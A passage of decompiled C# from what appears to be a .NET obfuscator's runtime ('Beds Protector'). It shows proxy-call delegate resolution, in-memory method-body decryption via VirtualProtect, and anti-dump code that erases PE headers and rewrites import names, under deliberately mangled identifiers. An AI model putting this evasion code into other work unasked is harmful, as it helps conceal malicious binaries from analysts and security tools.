    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogmBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogmBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogMBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogMBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 1400 + 32657 - 34057;
    FieldInfo fieldFromHandle;
    Type[] parameterTypes;
    MethodInfo methodInfo;
    Type fieldType;
    MethodBase method;
    DynamicMethod dynamicMethod;
    Type declaringType;
    do
    {
      byte[] numArray;
      int num2;
      int metadataToken;
      if (num1 == 46035 - 85144 + 39113)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num4 = num3 - 1]) << 16) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num5 = num4 - 1]) << 24);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[3] ^ (int) numArray[num2 = num7 - 1]) << 8;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDognBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDognBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 48173 - 56083 + 7915;
      }
      if (num1 != 23608 - 65379 + 41795)
        goto label_6;
label_4:
      int index1;
      if (index1 >= parameterTypes.Length)
        num1 = 65637 - 100864 + 35252;
      else
        goto label_40;
label_6:
      if (num1 == 46275 - 117584 + 71310)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 58458 - 43998 - 14458;
      }
      if (num1 != 65111 + 23466 - 88561)
        goto label_10;
label_9:
      MethodInfo[] methods;
      int index2;
      methodInfo = methods[index2];
      num1 = 41796 + 2308 - 44087;
label_10:
      if (num1 == 13399 + 80148 - 93524)
      {
        ++index1;
        num1 = 53451 - 43833 - 9594;
      }
      ParameterInfo[] parameters;
      if (num1 == 24563 - 36760 + 12216)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 65206 - 75718 + 10532;
      }
      if (num1 == 5035 - 36446 + 31423)
      {
        parameterTypes = (Type[]) null;
        num1 = 82652 - 169894 + 87255;
      }
      if (num1 == 71240 - 154595 + 83364)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 53022 + 29355 - 82367;
      }
      if (num1 == 59014 - 116762 + 57755)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 37458 - 11866 - 25584;
      }
      if (num1 == 45495 - 22344 - 23133)
      {
        parameters = methodInfo.GetParameters();
        num1 = 95026 - 136412 + 41405;
      }
      if (num1 == 14391 - 37909 + 23523)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 29342 + 32201 - 61537;
      }
      if (num1 == 23035 - 28178 + 5149)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 60777 - 142514 + 81744;
      }
      if (num1 == 83034 - 60668 - 22349)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 56322 + 1305 - 57609;
        }
        else
        {
          ++index2;
          goto label_57;
        }
      }
      if (num1 == 60722 - 136188 + 75479)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 11157 - 79976 + 68833;
      }
      if (num1 != 51839 - 139704 + 87876)
        goto label_33;
label_32:
      dynamicMethod = (DynamicMethod) null;
      num1 = 86632 - 47169 - 39451;
label_33:
      if (num1 == 6722 + 87399 - 94107)
      {
        index2 = 0;
        num1 = 90018 - 103770 + 13767;
      }
      if (num1 != 63731 - 32251 - 31459)
      {
        if (num1 == 77217 - 84292 + 7078)
        {
          num2 = numArray.Length;
          num1 = 76010 - 144383 + 68377;
        }
        if (num1 == 9435 + 3234 - 12659)
          return;
        if (num1 != 9816 + 65925 - 75719)
          goto label_41;
      }
      else
        goto label_4;
label_40:
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = 54689 - 108635 + 53969;
label_41:
      if (num1 == 73660 - 12294 - 61358)
      {
        if (method.IsStatic)
          num1 = 65698 - 109102 + 43413;
        else
          goto label_32;
      }
      if (num1 == 87636 - 160168 + 72552)
      {
        index1 = 0;
        num1 = 83467 + 8582 - 92028;
      }
      if (num1 == 18349 + 26149 - 44473)
      {
        declaringType = method.DeclaringType;
        num1 = 74993 + 21232 - 96199;
      }
      if (num1 == 61755 - 94434 + 32681)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 19499 - 95016 + 75520;
      }
      if (num1 != 48928 + 26792 - 75705)
      {
        if (num1 == 20630 + 38047 - 58677)
          num1 = 77490 - 7573 - 69916;
        continue;
      }
label_57:
      if (index2 < methods.Length)
        goto label_9;
      else
        goto label_58;
    }
    while (num1 != 92888 - 68003 - 24859);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[0] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDognBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDognBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  internal static extern bool Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogNBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogNBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] IntPtr obj0,
    [In] uint obj1,
    [In] uint obj2,
    [In] ref uint obj3);

  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  internal static extern unsafe bool Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] byte* obj0,
    [In] int obj1,
    [In] uint obj2,
    [In] ref uint obj3);

  internal static unsafe void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogOBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogOBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ()
  {
    Module module1 = typeof (\u003CModule\u003E).Module;
    string fullyQualifiedName = module1.FullyQualifiedName;
    bool flag = fullyQualifiedName.Length > 0 && fullyQualifiedName[0] == '<';
    byte* hinstance1 = (byte*) (void*) Marshal.GetHINSTANCE(module1);
    byte* numPtr1 = hinstance1 + *(uint*) (hinstance1 + 60);
    ushort num1 = *(ushort*) (numPtr1 + 6);
    ushort num2 = *(ushort*) (numPtr1 + 20);
    uint* numPtr2 = (uint*) null;
    uint num3 = 0;
    uint* numPtr3 = (uint*) (numPtr1 + 24 + (int) num2);
    uint num4 = 292121490;
    uint num5 = 1959176315;
    uint num6 = 2709105106;
    uint num7 = 3877970712;
    for (int index1 = 0; index1 < (int) num1; ++index1)
    {
      uint* numPtr4 = numPtr3;
      uint* numPtr5 = (uint*) ((IntPtr) numPtr4 + 4);
      int num8 = (int) *numPtr4;
      uint* numPtr6 = numPtr5;
      uint* numPtr7 = (uint*) ((IntPtr) numPtr6 + 4);
      int num9 = (int) *numPtr6;
      switch ((uint) (num8 * num9))
      {
        case 0:
          numPtr3 = numPtr7 + 8;
          continue;
        case 67411432:
          numPtr2 = (uint*) (hinstance1 + (flag ? numPtr7[3] : numPtr7[1]));
          num3 = (flag ? numPtr7[2] : *numPtr7) >> 2;
          goto case 0;
        default:
          uint* numPtr8 = (uint*) (hinstance1 + (flag ? numPtr7[3] : numPtr7[1]));
          uint num10 = numPtr7[2] >> 2;
          for (uint index2 = 0; index2 < num10; ++index2)
          {
            int num11 = ((int) num4 ^ (int) *numPtr8++) + (int) num5 + (int) num6 * (int) num7;
            num4 = num5;
            num5 = num7;
            num7 = (uint) num11;
          }
          goto case 0;
      }
    }
    uint[] numArray1 = new uint[16];
    uint[] numArray2 = new uint[16];
    for (int index = 0; index < 16; ++index)
    {
      numArray1[index] = num7;
      numArray2[index] = num5;
      uint num12 = num5 >> 5 | num5 << 27;
      num5 = num6 >> 3 | num6 << 29;
      num6 = num7 >> 7 | num7 << 25;
      num7 = num12 >> 11 | num12 << 21;
    }
    numArray1[0] = numArray1[0] ^ numArray2[0];
    numArray1[1] = numArray1[1] * numArray2[1];
    numArray1[2] = numArray1[2] + numArray2[2];
    numArray1[3] = numArray1[3] ^ numArray2[3];
    numArray1[4] = numArray1[4] * numArray2[4];
    numArray1[5] = numArray1[5] + numArray2[5];
    numArray1[6] = numArray1[6] ^ numArray2[6];
    numArray1[7] = numArray1[7] * numArray2[7];
    numArray1[8] = numArray1[8] + numArray2[8];
    numArray1[9] = numArray1[9] ^ numArray2[9];
    numArray1[10] = numArray1[10] * numArray2[10];
    numArray1[11] = numArray1[11] + numArray2[11];
    numArray1[12] = numArray1[12] ^ numArray2[12];
    numArray1[13] = numArray1[13] * numArray2[13];
    numArray1[14] = numArray1[14] + numArray2[14];
    numArray1[15] = numArray1[15] ^ numArray2[15];
    uint num13 = 64;
    \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogNBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogNBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((IntPtr) (void*) numPtr2, num3 << 2, num13, ref num13);
    if (num13 == 64U)
      return;
    uint num14 = 0;
    for (uint index = 0; index < num3; ++index)
    {
      uint* numPtr9 = numPtr2;
      int num15 = (int) *numPtr9 ^ (int) numArray1[(int) num14 & 15];
      *numPtr9 = (uint) num15;
      numArray1[(int) num14 & 15] = (uint) (((int) numArray1[(int) num14 & 15] ^ (int) *numPtr2++) + 1035675673);
      ++num14;
    }
    Module module2 = typeof (\u003CModule\u003E).Module;
    byte* hinstance2 = (byte*) (void*) Marshal.GetHINSTANCE(module2);
    byte* numPtr10 = hinstance2 + 60;
    byte* numPtr11 = hinstance2 + *(uint*) numPtr10 + 6;
    ushort length = *(ushort*) numPtr11;
    byte* numPtr12 = numPtr11 + 14;
    ushort num16 = *(ushort*) numPtr12;
    byte* destination = numPtr12 + 4 + (int) num16;
    byte* numPtr13 = stackalloc byte[11];
    if (module2.FullyQualifiedName[0] != '<')
    {
      byte* numPtr14 = hinstance2 + *(uint*) (destination - 16);
      uint num17;
      if (*(uint*) (destination - 120) != 0U)
      {
        byte* numPtr15 = hinstance2 + *(uint*) (destination - 120);
        byte* numPtr16 = hinstance2 + *(uint*) numPtr15;
        byte* numPtr17 = hinstance2 + *(uint*) (numPtr15 + 12);
        byte* numPtr18 = hinstance2 + *(uint*) numPtr16 + 2;
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr17, 11, 64U, ref num17);
        *(int*) numPtr13 = 1818522734;
        *(int*) (numPtr13 + 4) = 1818504812;
        *(short*) (numPtr13 + (new IntPtr(4) * 2).ToInt64()) = (short) 108;
        numPtr13[10] = (byte) 0;
        for (int index = 0; index < 11; ++index)
          numPtr17[index] = numPtr13[index];
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr18, 11, 64U, ref num17);
        *(int*) numPtr13 = 1866691662;
        *(int*) (numPtr13 + 4) = 1852404846;
        *(short*) (numPtr13 + (new IntPtr(4) * 2).ToInt64()) = (short) 25973;
        numPtr13[10] = (byte) 0;
        for (int index = 0; index < 11; ++index)
          numPtr18[index] = numPtr13[index];
      }
      for (int index = 0; index < (int) length; ++index)
      {
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(destination, 8, 64U, ref num17);
        Marshal.Copy(new byte[8], 0, (IntPtr) (void*) destination, 8);
        destination += 40;
      }
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr14, 72, 64U, ref num17);
      byte* numPtr19 = hinstance2 + *(uint*) (numPtr14 + 8);
      *(int*) numPtr14 = 0;
      *(int*) (numPtr14 + 4) = 0;
      *(int*) (numPtr14 + (new IntPtr(2) * 4).ToInt64()) = 0;
      *(int*) (numPtr14 + (new IntPtr(3) * 4).ToInt64()) = 0;
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr19, 4, 64U, ref num17);
      *(int*) numPtr19 = 0;
      byte* numPtr20 = numPtr19 + 12;
      byte* numPtr21 = (byte*) ((ulong) (numPtr20 + *(uint*) numPtr20) + 7UL & 18446744073709551612UL) + 2;
      ushort num18 = (ushort) *numPtr21;
      byte* numPtr22 = numPtr21 + 2;
      for (int index3 = 0; index3 < (int) num18; ++index3)
      {
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr22, 8, 64U, ref num17);
        numPtr22 = numPtr22 + 4 + 4;
        for (int index4 = 0; index4 < 8; ++index4)
        {
          \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr22, 4, 64U, ref num17);
          *numPtr22 = (byte) 0;
          byte* numPtr23 = numPtr22 + 1;
          if (*numPtr23 == (byte) 0)
          {
            numPtr22 = numPtr23 + 3;
            break;
          }
          *numPtr23 = (byte) 0;
          byte* numPtr24 = numPtr23 + 1;
          if (*numPtr24 == (byte) 0)
          {
            numPtr22 = numPtr24 + 2;
            break;
          }
          *numPtr24 = (byte) 0;
          byte* numPtr25 = numPtr24 + 1;
          if (*numPtr25 == (byte) 0)
          {
            numPtr22 = numPtr25 + 1;
            break;
          }
          *numPtr25 = (byte) 0;
          numPtr22 = numPtr25 + 1;
        }
      }
    }
    else
    {
      uint num19 = *(uint*) (destination - 16);
      uint num20 = *(uint*) (destination - 120);
      uint[] numArray3 = new uint[(int) length];
      uint[] numArray4 = new uint[(int) length];
      uint[] numArray5 = new uint[(int) length];
      uint num21;
      for (int index = 0; index < (int) length; ++index)
      {
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(destination, 8, 64U, ref num21);
        Marshal.Copy(new byte[8], 0, (IntPtr) (void*) destination, 8);
        numArray3[index] = *(uint*) (destination + 12);
        numArray4[index] = *(uint*) (destination + 8);
        numArray5[index] = *(uint*) (destination + 20);
        destination += 40;
      }
      if (num20 != 0U)
      {
        for (int index = 0; index < (int) length; ++index)
        {
          if (numArray3[index] <= num20 && num20 < numArray3[index] + numArray4[index])
          {
            num20 = num20 - numArray3[index] + numArray5[index];
            break;
          }
        }
        byte* numPtr26 = hinstance2 + num20;
        uint num22 = *(uint*) numPtr26;
        for (int index = 0; index < (int) length; ++index)
        {
          if (numArray3[index] <= num22 && num22 < numArray3[index] + numArray4[index])
          {
            num22 = num22 - numArray3[index] + numArray5[index];
            break;
          }
        }
        byte* numPtr27 = hinstance2 + num22;
        uint num23 = *(uint*) (numPtr26 + 12);
        for (int index = 0; index < (int) length; ++index)
        {
          if (numArray3[index] <= num23 && num23 < numArray3[index] + numArray4[index])
          {
            num23 = num23 - numArray3[index] + numArray5[index];
            break;
          }
        }
        uint num24 = *(uint*) numPtr27 + 2U;
        for (int index = 0; index < (int) length; ++index)
        {
          if (numArray3[index] <= num24 && num24 < numArray3[index] + numArray4[index])
          {
            num24 = num24 - numArray3[index] + numArray5[index];
            break;
          }
        }
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(hinstance2 + num23, 11, 64U, ref num21);
        *(int*) numPtr13 = 1818522734;
        *(int*) (numPtr13 + 4) = 1818504812;
        *(short*) (numPtr13 + (new IntPtr(4) * 2).ToInt64()) = (short) 108;
        numPtr13[10] = (byte) 0;
        for (int index = 0; index < 11; ++index)
          (hinstance2 + num23)[index] = numPtr13[index];
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(hinstance2 + num24, 11, 64U, ref num21);
        *(int*) numPtr13 = 1866691662;
        *(int*) (numPtr13 + 4) = 1852404846;
        *(short*) (numPtr13 + (new IntPtr(4) * 2).ToInt64()) = (short) 25973;
        numPtr13[10] = (byte) 0;
        for (int index = 0; index < 11; ++index)
          (hinstance2 + num24)[index] = numPtr13[index];
      }
      for (int index = 0; index < (int) length; ++index)
      {
        if (numArray3[index] <= num19 && num19 < numArray3[index] + numArray4[index])
        {
          num19 = num19 - numArray3[index] + numArray5[index];
          break;
        }
      }
      byte* numPtr28 = hinstance2 + num19;
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr28, 72, 64U, ref num21);
      uint num25 = *(uint*) (numPtr28 + 8);
      for (int index = 0; index < (int) length; ++index)
      {
        if (numArray3[index] <= num25 && num25 < numArray3[index] + numArray4[index])
        {
          num25 = num25 - numArray3[index] + numArray5[index];
          break;
        }
      }
      *(int*) numPtr28 = 0;
      *(int*) (numPtr28 + 4) = 0;
      *(int*) (numPtr28 + (new IntPtr(2) * 4).ToInt64()) = 0;
      *(int*) (numPtr28 + (new IntPtr(3) * 4).ToInt64()) = 0;
      byte* numPtr29 = hinstance2 + num25;
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr29, 4, 64U, ref num21);
      *(int*) numPtr29 = 0;
      byte* numPtr30 = numPtr29 + 12;
      byte* numPtr31 = (byte*) ((ulong) (numPtr30 + *(uint*) numPtr30) + 7UL & 18446744073709551612UL) + 2;
      ushort num26 = (ushort) *numPtr31;
      byte* numPtr32 = numPtr31 + 2;
      for (int index5 = 0; index5 < (int) num26; ++index5)
      {
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr32, 8, 64U, ref num21);
        numPtr32 = numPtr32 + 4 + 4;
        for (int index6 = 0; index6 < 8; ++index6)
        {
          \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr32, 4, 64U, ref num21);
          *numPtr32 = (byte) 0;
          byte* numPtr33 = numPtr32 + 1;
          if (*numPtr33 == (byte) 0)
          {
            numPtr32 = numPtr33 + 3;
            break;
          }
          *numPtr33 = (byte) 0;
          byte* numPtr34 = numPtr33 + 1;
          if (*numPtr34 == (byte) 0)
          {
            numPtr32 = numPtr34 + 2;
            break;
          }
          *numPtr34 = (byte) 0;
          byte* numPtr35 = numPtr34 + 1;
          if (*numPtr35 == (byte) 0)
          {
            numPtr32 = numPtr35 + 1;
            break;
          }
          *numPtr35 = (byte) 0;
          numPtr32 = numPtr35 + 1;
        }
      }
    }
  }
}
